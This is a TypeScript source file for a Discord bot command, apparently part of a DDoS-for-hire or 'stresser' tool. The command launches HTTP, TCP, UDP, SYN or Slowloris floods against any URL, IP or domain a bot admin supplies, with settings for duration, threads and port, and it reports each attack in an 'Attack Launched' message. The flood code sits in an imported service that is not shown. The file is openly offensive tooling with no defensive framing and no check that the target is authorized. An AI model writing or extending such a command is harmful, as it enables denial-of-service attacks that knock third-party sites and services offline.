import { SlashCommandBuilder, ChatInputCommandInteraction, EmbedBuilder } from 'discord.js';
import { AttackConfig, DDoSMethod } from '../../types';
import { ddosService } from '../../services/ddos';
import { isValidUrl, isValidIp, isValidDomain, isValidDuration, isValidThreads, isAdmin } from '../../utils/validators';
import { rateLimiter } from '../../utils/rate-limiter';
import { logger } from '../../utils/logger';

export const data = new SlashCommandBuilder()
  .setName('attack')
  .setDescription('Launch a DDoS attack')
  .addStringOption((option) =>
    option
      .setName('target')
      .setDescription('Target URL, IP, or domain')
      .setRequired(true)
  )
  .addStringOption((option) =>
    option
      .setName('method')
      .setDescription('Attack method')
      .setRequired(true)
      .addChoices(
        { name: 'HTTP Flood', value: 'http-flood' },
        { name: 'TCP Flood', value: 'tcp-flood' },
        { name: 'UDP Flood', value: 'udp-flood' },
        { name: 'Slowloris', value: 'slowloris' },
        { name: 'SYN Flood', value: 'syn-flood' }
      )
  )
  .addIntegerOption((option) =>
    option
      .setName('duration')
      .setDescription('Attack duration in seconds')
      .setRequired(true)
      .setMinValue(1)
      .setMaxValue(300)
  )
  .addIntegerOption((option) =>
    option
      .setName('threads')
      .setDescription('Number of threads')
      .setRequired(true)
      .setMinValue(1)
      .setMaxValue(100)
  )
  .addIntegerOption((option) =>
    option
      .setName('port')
      .setDescription('Target port (for TCP/UDP floods)')
      .setMinValue(1)
      .setMaxValue(65535)
  );

export async function execute(interaction: ChatInputCommandInteraction): Promise<void> {
  if (!isAdmin(interaction.user.id)) {
    await interaction.reply({
      content: '❌ You do not have permission to use this command.',
      ephemeral: true,
    });
    return;
  }

  if (!rateLimiter.isAllowed(interaction.user.id, 'attack', 5, 60000)) {
    await interaction.reply({
      content: '❌ Rate limit exceeded. Please wait before launching another attack.',
      ephemeral: true,
    });
    return;
  }

  const target = interaction.options.getString('target', true);
  const method = interaction.options.getString('method', true) as DDoSMethod;
  const duration = interaction.options.getInteger('duration', true);
  const threads = interaction.options.getInteger('threads', true);
  const port = interaction.options.getInteger('port');

  if (!isValidUrl(target) && !isValidIp(target) && !isValidDomain(target)) {
    await interaction.reply({
      content: '❌ Invalid target. Please provide a valid URL, IP address, or domain.',
      ephemeral: true,
    });
    return;
  }

  if (!isValidDuration(duration)) {
    await interaction.reply({
      content: `❌ Invalid duration. Maximum allowed: 300 seconds.`,
      ephemeral: true,
    });
    return;
  }

  if (!isValidThreads(threads)) {
    await interaction.reply({
      content: `❌ Invalid thread count. Maximum allowed: 100.`,
      ephemeral: true,
    });
    return;
  }

  await interaction.deferReply();

  try {
    const config: AttackConfig = {
      target,
      method,
      duration,
      threads,
      port: port || undefined,
    };

    await ddosService.start(config);

    const embed = new EmbedBuilder()
      .setTitle('🚀 Attack Launched')
      .setColor(0xff0000)
      .addFields(
        { name: 'Target', value: target, inline: true },
        { name: 'Method', value: method, inline: true },
        { name: 'Duration', value: `${duration}s`, inline: true },
        { name: 'Threads', value: threads.toString(), inline: true },
        { name: 'Port', value: port ? port.toString() : 'N/A', inline: true }
      )
      .setTimestamp();

    await interaction.editReply({ embeds: [embed] });

    logger.info(`Attack launched by ${interaction.user.id} on ${target}`);
  } catch (error: any) {
    logger.error('Failed to launch attack', error);
    await interaction.editReply({
      content: `❌ Failed to launch attack: ${error.message}`,
    });
  }
}

